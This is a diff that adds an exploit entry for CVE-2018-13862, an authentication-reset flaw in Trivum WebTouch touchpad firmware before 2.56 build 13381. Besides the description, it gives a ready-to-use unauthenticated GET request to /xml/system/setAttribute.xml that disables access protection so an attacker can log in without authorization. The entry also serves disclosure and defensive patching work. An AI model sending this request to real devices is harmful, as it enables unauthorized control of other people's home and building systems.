@@ -1,0 +1,33 @@
+# Exploit Title: Touchpad / Trivum WebTouch Setup V9 V2.53 build 13163 - Unauthorized Authentication Reset
+
+# Date: 2018-07-20
+
+# Software Link: https://world.trivum-shop.de
+
+# Version: < 2.56 build 13381 - 12-07-2018
+
+# Category: webapps 
+
+# Tested on: 
+
+Touchpad / Trivum WebTouch Setup V9 V2.53 build 13163 of Apr 6 2018 09:10:14 (FW 303)
+
+# Exploit Author: vulnc0d3
+
+# Contact: http://twitter.com/HerwonoWr
+
+# CVE: CVE-2018-13862
+
+1. Description 
+
+Touchpad / Trivum WebTouch Setup V9 V2.53 build 13163 of Apr 6 2018 09:10:14 (FW 303) before 2.56 build 13381 - 12.07.2018, allow unauthorized remote attackers to reset the authentication via "/xml/system/setAttribute.xml" URL, using GET request to the end-point "?id=0&attr=protectAccess&newValue=0" (successful attack will allow attackers to login without authorization). 
+
+2. Proof of Concept
+
+# GET Request
+
+http://target/xml/system/setAttribute.xml?id=0&attr=protectAccess&newValue=0
+
+3. Vendor Changes Log
+
+# http://update.trivum.com/update/tp9-changes.html
